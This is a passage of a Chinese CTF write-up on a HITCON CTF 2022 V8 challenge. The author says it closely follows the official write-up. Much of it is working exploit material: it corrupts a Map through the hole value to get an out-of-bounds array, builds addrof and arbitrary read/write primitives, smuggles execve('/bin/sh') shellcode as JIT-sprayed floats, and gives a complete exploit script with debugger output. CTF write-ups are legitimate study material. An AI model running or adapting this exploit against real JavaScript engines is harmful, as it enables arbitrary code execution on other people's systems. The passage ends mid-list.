<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">d8&gt; m.<span class="built_in">set</span>(oob_arr, <span class="number">0xffff</span>);</span><br><span class="line">[object Map]</span><br><span class="line">d8&gt; oob_arr.length</span><br><span class="line"><span class="number">65535</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">30</span>xw <span class="number">0x233e0004bacd</span><span class="number">-1</span>+<span class="number">0x54</span></span><br><span class="line"><span class="number">0x233e0004bb20</span>:	<span class="number">0x0004bb19</span>	<span class="number">0x0001fffe</span>	<span class="number">0xfffffffe</span>	<span class="number">0x00000004</span></span><br><span class="line"><span class="number">0x233e0004bb30</span>:	<span class="number">0x9999999a</span>	<span class="number">0x3ff19999</span>	<span class="number">0x9999999a</span>	<span class="number">0x40019999</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>oob_arr</code> 的长度已经被修改了，完成了 Array OOB 数组越界</li>
</ul>
<p>现在我们有一个可以进行 OOB 读写的数组，为了控制 RIP，我们需要能够执行：</p>
<ul>
<li>addrof：获取对象的地址<ul>
<li>创建一个名为 victims 的新变量，它是一个空对象的数组</li>
<li>将目标对象分配给 victims 数组的元素之一</li>
<li>使用从 <code>oob_arr</code> 读取的 OOB，读取受害者元素的存储值（即目标对象地址）</li>
</ul>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">victim = [&#123;&#125;, &#123;&#125;, &#123;&#125;, &#123;&#125;];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addrof</span>(<span class="params">in_obj</span>) </span>&#123;</span><br><span class="line">    mask = (<span class="number">1n</span> &lt;&lt; <span class="number">32n</span>) - <span class="number">1n</span></span><br><span class="line">    victim[<span class="number">0</span>] = in_obj;</span><br><span class="line">    <span class="keyword">return</span> ftoi(oob_arr[<span class="number">12</span>]) &amp; mask;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>read：读取给定地址的值（RAA）<ul>
<li>创建一个名为 read_gadget 的数组，该数组由浮点值组成</li>
<li>使用 OOB 从 <code>oob_arr</code> 写入，利用溢出覆盖 <code>read_gadget[0]</code>，使其指向 <code>target_addr-0x8</code>（数组的第一个元素存储在 <code>elements+0x8</code> 中）</li>
<li>返回 <code>read_gadget[0]</code></li>
</ul>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">read_gadget = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">weak_read</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">    oob_arr[<span class="number">37</span>] = itof(<span class="number">0x600000000n</span>+addr-<span class="number">0x8n</span>);</span><br><span class="line">    <span class="keyword">return</span> ftoi(read_gadget[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>write：将值写入给定地址（WAA）<ul>
<li>前面和 read 类似</li>
<li>但我们没有返回 <code>read_gadget[0]</code> 值</li>
<li>而是为 <code>read_gadget[0]</code> 分配了我们所需的值</li>
</ul>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">weak_write</span>(<span class="params">addr, value</span>) </span>&#123;</span><br><span class="line">    oob_arr[<span class="number">37</span>] = itof(<span class="number">0x600000000n</span>+addr-<span class="number">0x8n</span>);</span><br><span class="line">    read_gadget[<span class="number">0</span>] = itof(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接下来我们需要寻找控制 RIP 的方法（劫持程序的执行流）</p>
<p>实际上，可以通过 JIT 喷射攻击来走私 shellcode 代码：（绕过 sandbox）</p>
<ul>
<li>我们可以做的是将我们的 shellcode 转换为浮点数，以便我们的浮点数十六进制按原样存储在 Jitted 函数区域中</li>
<li>实例代码如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> foo = ()=&gt;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> [<span class="number">1.0</span>,</span><br><span class="line">        <span class="number">1.95538254221075331056310651818E-246</span>,</span><br><span class="line">        <span class="number">1.95606125582421466942709801013E-246</span>,</span><br><span class="line">        <span class="number">1.99957147195425773436923756715E-246</span>,</span><br><span class="line">        <span class="number">1.95337673326740932133292175341E-246</span>,</span><br><span class="line">        <span class="number">2.63486047652296056448306022844E-284</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (let i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++) &#123;foo();foo();foo();foo();&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>JavaScript 中定义的浮点实际上是走私的 shellcode</li>
<li>它将执行 <code>sys_execve(&#39;/bin/sh&#39;)</code></li>
<li>由于该函数被调用了很多次，因此 v8 将对代码进行 JIT（启用 TURBOFAN）</li>
</ul>
<p>使用 GDB 打印内存信息：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">d8&gt; %DebugPrint(foo)</span><br><span class="line">DebugPrint: <span class="number">0xc25002c278d</span>: [Function] in OldSpace</span><br><span class="line"> - <span class="built_in">map</span>: <span class="number">0x0c2500184241</span> &lt;Map[<span class="number">28</span>](HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x0c25001840f5</span> &lt;JSFunction (sfi = <span class="number">0xc2500145dfd</span>)&gt;</span><br><span class="line"> - elements: <span class="number">0x0c2500002259</span> &lt;FixedArray[<span class="number">0</span>]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - function prototype: &lt;no-prototype-slot&gt;</span><br><span class="line"> - shared_info: <span class="number">0x0c2500199f11</span> &lt;SharedFunctionInfo foo&gt;</span><br><span class="line"> - name: <span class="number">0x0c2500199ea5</span> &lt;String[<span class="number">3</span>]: <span class="meta">#foo&gt;</span></span><br><span class="line"> - formal_parameter_count: <span class="number">0</span></span><br><span class="line"> - kind: ArrowFunction</span><br><span class="line"> - context: <span class="number">0x0c250019a005</span> &lt;ScriptContext[<span class="number">3</span>]&gt;</span><br><span class="line"> - code: <span class="number">0x0c250019a2dd</span> &lt;CodeDataContainer TURBOFAN&gt;</span><br><span class="line"> - source code: ()=&gt;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> [<span class="number">1.0</span>,</span><br><span class="line">        <span class="number">1.95538254221075331056310651818E-246</span>,</span><br><span class="line">        <span class="number">1.95606125582421466942709801013E-246</span>,</span><br><span class="line">        <span class="number">1.99957147195425773436923756715E-246</span>,</span><br><span class="line">        <span class="number">1.95337673326740932133292175341E-246</span>,</span><br><span class="line">        <span class="number">2.63486047652296056448306022844E-284</span>];</span><br><span class="line">&#125;</span><br><span class="line"> - properties: <span class="number">0x0c2500002259</span> &lt;FixedArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - <span class="function">All own <span class="title">properties</span> <span class="params">(excluding elements)</span>: </span>&#123;</span><br><span class="line">    <span class="number">0xc2500006551</span>: [String] in ReadOnlySpace: <span class="meta">#length: 0x0c25001442fd <span class="meta-string">&lt;AccessorInfo name= 0x0c2500006551 &lt;String[6]: #length&gt;</span>, data= 0x0c25000023e1 <span class="meta-string">&lt;undefined&gt;</span>&gt; (const accessor descriptor), location: descriptor</span></span><br><span class="line">    <span class="number">0xc2500006799</span>: [String] in ReadOnlySpace: <span class="meta">#name: 0x0c25001442e5 <span class="meta-string">&lt;AccessorInfo name= 0x0c2500006799 &lt;String[4]: #name&gt;</span>, data= 0x0c25000023e1 <span class="meta-string">&lt;undefined&gt;</span>&gt; (const accessor descriptor), location: descriptor</span></span><br><span class="line"> &#125;</span><br><span class="line"> - feedback <span class="built_in">vector</span>: <span class="number">0xc250019a0c9</span>: [FeedbackVector] in OldSpace</span><br><span class="line"> - <span class="built_in">map</span>: <span class="number">0x0c250000273d</span> &lt;Map(FEEDBACK_VECTOR_TYPE)&gt;</span><br><span class="line"> - length: <span class="number">1</span></span><br><span class="line"> - shared function info: <span class="number">0x0c2500199f11</span> &lt;SharedFunctionInfo foo&gt;</span><br><span class="line"> - no optimized code</span><br><span class="line"> - tiering state: TieringState::kNone</span><br><span class="line"> - maybe has maglev code: <span class="number">0</span></span><br><span class="line"> - maybe has turbofan code: <span class="number">0</span></span><br><span class="line"> - invocation count: <span class="number">214279</span></span><br><span class="line"> - profiler ticks: <span class="number">0</span></span><br><span class="line"> - closure feedback cell <span class="built_in">array</span>: <span class="number">0xc2500003511</span>: [ClosureFeedbackCellArray] in ReadOnlySpace</span><br><span class="line"> - <span class="built_in">map</span>: <span class="number">0x0c2500002981</span> &lt;Map(CLOSURE_FEEDBACK_CELL_ARRAY_TYPE)&gt;</span><br><span class="line"> - length: <span class="number">0</span></span><br><span class="line"></span><br><span class="line"> - slot #<span class="number">0</span> Literal  &#123;</span><br><span class="line">     [<span class="number">0</span>]: <span class="number">0x0c250019a185</span> &lt;AllocationSite&gt;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="number">0xc2500184241</span>: [Map] in OldSpace</span><br><span class="line"> - type: JS_FUNCTION_TYPE</span><br><span class="line"> - instance size: <span class="number">28</span></span><br><span class="line"> - inobject properties: <span class="number">0</span></span><br><span class="line"> - elements kind: HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: <span class="number">0</span></span><br><span class="line"> - <span class="class"><span class="keyword">enum</span> <span class="title">length</span>:</span> invalid</span><br><span class="line"> - callable</span><br><span class="line"> - back pointer: <span class="number">0x0c25000023e1</span> &lt;undefined&gt;</span><br><span class="line"> - prototype_validity cell: <span class="number">0x0c25001443cd</span> &lt;Cell value= <span class="number">1</span>&gt;</span><br><span class="line"> - instance descriptors (own) #<span class="number">2</span>: <span class="number">0x0c2500184269</span> &lt;DescriptorArray[<span class="number">2</span>]&gt;</span><br><span class="line"> - prototype: <span class="number">0x0c25001840f5</span> &lt;JSFunction (sfi = <span class="number">0xc2500145dfd</span>)&gt;</span><br><span class="line"> - constructor: <span class="number">0x0c2500002261</span> &lt;null&gt;</span><br><span class="line"> - dependent code: <span class="number">0x0c25000021e1</span> &lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&gt;</span><br><span class="line"> - construction counter: <span class="number">0</span></span><br><span class="line"></span><br><span class="line">()=&gt;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> [<span class="number">1.0</span>,</span><br><span class="line">        <span class="number">1.95538254221075331056310651818E-246</span>,</span><br><span class="line">        <span class="number">1.95606125582421466942709801013E-246</span>,</span><br><span class="line">        <span class="number">1.99957147195425773436923756715E-246</span>,</span><br><span class="line">        <span class="number">1.95337673326740932133292175341E-246</span>,</span><br><span class="line">        <span class="number">2.63486047652296056448306022844E-284</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>请注意，<code>foo</code> 方法中有一个名为 code 的属性，其中基于 gdb 中的检查，偏移量为 <code>foo+0x18</code></li>
<li>接下来打印 code 属性的信息：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job <span class="number">0x0c250019a2dd</span></span><br><span class="line"><span class="number">0xc250019a2dd</span>: [CodeDataContainer] in OldSpace</span><br><span class="line"> - <span class="built_in">map</span>: <span class="number">0x0c2500002a71</span> &lt;Map[<span class="number">28</span>](CODE_DATA_CONTAINER_TYPE)&gt;</span><br><span class="line"> - kind: TURBOFAN</span><br><span class="line"> - is_off_heap_trampoline: <span class="number">0</span></span><br><span class="line"> - code: <span class="number">0x55e3400042c1</span> &lt;Code TURBOFAN&gt;</span><br><span class="line"> - code_entry_point: <span class="number">0x55e340004300</span></span><br><span class="line"> - kind_specific_flags: <span class="number">4</span></span><br></pre></td></tr></table></figure>
<ul>
<li>code：指向 jitted code 区域（<code>code + 0x8</code>）</li>
<li>code_entry_point：指向 jitted code 指令的开头（<code>code + 0xc</code>）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job <span class="number">0x55e3400042c1</span> <span class="comment">/* jitted code */</span></span><br><span class="line"><span class="number">0x55e3400042c1</span>: [Code]</span><br><span class="line"> - <span class="built_in">map</span>: <span class="number">0x0c250000264d</span> &lt;Map(CODE_TYPE)&gt;</span><br><span class="line"> - code_data_container: <span class="number">0x0c250019a2dd</span> &lt;CodeDataContainer TURBOFAN&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x55e340004300</span> <span class="comment">/* code_entry_point */</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x55e340004300</span> ◂— mov    ebx, dword ptr [rcx - <span class="number">0x30</span>]</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x55e340004308</span> ◂— <span class="number">0x1fe88e70850f0117</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x55e340004310</span> ◂— push   rbp</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x55e340004318</span> ◂— sub    esp, <span class="number">8</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x55e340004320</span> ◂— xchg   bl, bh</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x55e340004328</span> ◂— add    bh, cl</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x55e340004330</span> ◂— cmp    qword ptr [r13 + <span class="number">0xcf08</span>], rdi</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x55e340004338</span> ◂— xchg   byte ptr [rbx], dl</span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0x55e340004340</span> ◂— cmp    byte ptr [rcx - <span class="number">0x77</span>], cl</span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│  <span class="number">0x55e340004348</span> ◂— add    rcx, <span class="number">1</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│  <span class="number">0x55e340004350</span> ◂— add    al, byte ptr [rax]</span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│  <span class="number">0x55e340004358</span> ◂— add    ecx, dword ptr [r8 + rax]</span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│  <span class="number">0x55e340004360</span> ◂— jbe    <span class="number">0x55e340004322</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│  <span class="number">0x55e340004368</span> ◂— stc    </span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│  <span class="number">0x55e340004370</span> ◂— <span class="number">0x68732f68ba4907</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│  <span class="number">0x55e340004378</span> ◂— pop    rax</span><br></pre></td></tr></table></figure>
<p>使用 WAA，让我们通过移动其存储值来覆盖此 <code>code_entry_point</code>，以指向我们的第一个走私 <code>shellcode</code>，以便当我们调用 <code>foo</code> 时，它将跳转并执行我们构建的 <code>shellcode</code></p>
<ul>
<li>PS：最好将目标 JIT 代码放在文件的顶部，这样它就不会弄乱我们创建的 WAA</li>
</ul>
<p>最后的入侵步骤：</p>
<ul>
<li>执行 <code>addrof(foo)</code> 获取 <code>foo</code> 对象的地址</li>
<li>使用 <code>weak_read</code> 获取 <code>foo+0x18</code>（<code>foo-&gt;code</code>）</li>
<li>使用 <code>weak_read</code> 获取 <code>foo-&gt;code+0xc</code>（<code>foo-&gt;code-&gt;code_entry_point</code>）</li>
<li>使用 <code>weak_write</code> 在 <code>foo-&gt;code</code> 处覆盖上 <code>foo-&gt;code-&gt;code_entry_point+shift_offset</code>（其中 <code>shift_offset</code> 是起始 JIT 代码指令到走私的 <code>shellcode</code> 代码之间的距离）</li>
</ul>
<p>通过调试来寻找 <code>shift_offset</code> 的值：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x5577a0004b00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x5577a0004b00</span> ◂— mov    ebx, dword ptr [rcx - <span class="number">0x30</span>]</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x5577a0004b08</span> ◂— <span class="number">0x1fe88670850f0117</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x5577a0004b10</span> ◂— push   rbp</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x5577a0004b18</span> ◂— sub    esp, <span class="number">8</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x5577a0004b20</span> ◂— xchg   bl, bh</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x5577a0004b28</span> ◂— add    bh, cl</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x5577a0004b30</span> ◂— cmp    qword ptr [r13 + <span class="number">0xcf08</span>], rdi</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x5577a0004b38</span> ◂— xchg   byte ptr [rbx], dl</span><br><span class="line">pwndbg&gt; </span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0x5577a0004b40</span> ◂— cmp    byte ptr [rcx - <span class="number">0x77</span>], cl</span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│  <span class="number">0x5577a0004b48</span> ◂— add    rcx, <span class="number">1</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│  <span class="number">0x5577a0004b50</span> ◂— add    al, byte ptr [rax]</span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│  <span class="number">0x5577a0004b58</span> ◂— add    ecx, dword ptr [r8 + rax]</span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│  <span class="number">0x5577a0004b60</span> ◂— jbe    <span class="number">0x5577a0004b22</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│  <span class="number">0x5577a0004b68</span> ◂— stc    </span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│  <span class="number">0x5577a0004b70</span> ◂— <span class="number">0x68732f68ba4907</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│  <span class="number">0x5577a0004b78</span> ◂— pop    rax</span><br></pre></td></tr></table></figure>
<p>其实这个 <code>shellcode</code> 的开头有一处很明显的特征：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:   <span class="number">68</span> <span class="number">2f</span> <span class="number">73</span> <span class="number">68</span> <span class="number">00</span>          push   <span class="number">0x68732f</span></span><br><span class="line"><span class="number">5</span>:   <span class="number">58</span>                      pop    rax</span><br><span class="line"><span class="number">6</span>:   eb <span class="number">0</span>c                   jmp    <span class="number">0x14</span></span><br></pre></td></tr></table></figure>
<ul>
<li>通过 <code>0x68732f</code> 就可以快速定位 <code>shellcode</code>：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x5577a0004b00</span>+<span class="number">115</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x5577a0004b73</span> ◂— push   <span class="number">0x68732f</span> <span class="comment">/* &#x27;h/sh&#x27; */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x5577a0004b7b</span> ◂— vmovq  xmm0, r10</span><br></pre></td></tr></table></figure>
<ul>
<li><code>shift_offset</code> 的值就是“115”</li>
</ul>
<p>完整 exp 如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> foo = <span class="function">()=&gt;</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> [<span class="number">1.0</span>,</span><br><span class="line">        <span class="number">1.95538254221075331056310651818E-246</span>,</span><br><span class="line">        <span class="number">1.95606125582421466942709801013E-246</span>,</span><br><span class="line">        <span class="number">1.99957147195425773436923756715E-246</span>,</span><br><span class="line">        <span class="number">1.95337673326740932133292175341E-246</span>,</span><br><span class="line">        <span class="number">2.63486047652296056448306022844E-284</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++) &#123;foo();foo();foo();foo();&#125;</span><br><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> f64_buf = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> u64_buf = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(buf);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ftoi</span>(<span class="params">val</span>) </span>&#123;</span><br><span class="line">    f64_buf[<span class="number">0</span>] = val;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">BigInt</span>(u64_buf[<span class="number">0</span>]) + (<span class="built_in">BigInt</span>(u64_buf[<span class="number">1</span>]) &lt;&lt; <span class="number">32n</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">itof</span>(<span class="params">val</span>) </span>&#123;</span><br><span class="line">    u64_buf[<span class="number">0</span>] = <span class="built_in">Number</span>(val &amp; <span class="number">0xffffffffn</span>);</span><br><span class="line">    u64_buf[<span class="number">1</span>] = <span class="built_in">Number</span>(val &gt;&gt; <span class="number">32n</span>);</span><br><span class="line">    <span class="keyword">return</span> f64_buf[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> c = [];</span><br><span class="line">m = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">m.set(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">m.set(c.hole(), <span class="number">1</span>);</span><br><span class="line">m.delete(c.hole());</span><br><span class="line">m.delete(c.hole());</span><br><span class="line">m.delete(<span class="number">1</span>);</span><br><span class="line">oob_arr = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">1.1</span>, <span class="number">2.2</span>);</span><br><span class="line">m.set(<span class="number">0x10</span>, -<span class="number">1</span>);</span><br><span class="line">m.set(oob_arr, <span class="number">0xffff</span>);</span><br><span class="line">victim = [&#123;&#125;, &#123;&#125;, &#123;&#125;, &#123;&#125;];</span><br><span class="line">read_gadget = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addrof</span>(<span class="params">in_obj</span>) </span>&#123;</span><br><span class="line">    mask = (<span class="number">1n</span> &lt;&lt; <span class="number">32n</span>) - <span class="number">1n</span></span><br><span class="line">    victim[<span class="number">0</span>] = in_obj;</span><br><span class="line">    <span class="keyword">return</span> ftoi(oob_arr[<span class="number">12</span>]) &amp; mask;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">weak_read</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">    oob_arr[<span class="number">37</span>] = itof(<span class="number">0x600000000n</span>+addr-<span class="number">0x8n</span>);</span><br><span class="line">    <span class="keyword">return</span> ftoi(read_gadget[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">weak_write</span>(<span class="params">addr, value</span>) </span>&#123;</span><br><span class="line">    oob_arr[<span class="number">37</span>] = itof(<span class="number">0x600000000n</span>+addr-<span class="number">0x8n</span>);</span><br><span class="line">    read_gadget[<span class="number">0</span>] = itof(value);</span><br><span class="line">&#125;</span><br><span class="line">f_foo = addrof(foo);</span><br><span class="line">f_code = weak_read(f_foo+<span class="number">0x18n</span>) &amp; ((<span class="number">1n</span> &lt;&lt; <span class="number">32n</span>) - <span class="number">1n</span>);</span><br><span class="line">f_code_code_entry_point = weak_read(f_code+<span class="number">0xcn</span>);</span><br><span class="line">weak_write(f_code+<span class="number">0xcn</span>, f_code_code_entry_point+<span class="number">115n</span>);</span><br><span class="line">foo();</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
<p>本人对 V8 不是很了解，只是之前复现过一些 JavaScript pwn</p>
<p>比赛时 V8 的环境我搭了很久，搭好后也不会做题，这个题就当是 V8 入门吧</p>
<p>全程模仿官方 wp，原文如下：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://chovid99.github.io/posts/hitcon-ctf-2022/#the-corrupted-maps-impact">HITCON CTF 2022 | Welcome to Chovid99’s Blog</a></li>
</ul>
<p>文章全英文，锻炼了一下阅读英语论文的能力</p>
<p>学习到的知识如下：</p>
<ul>
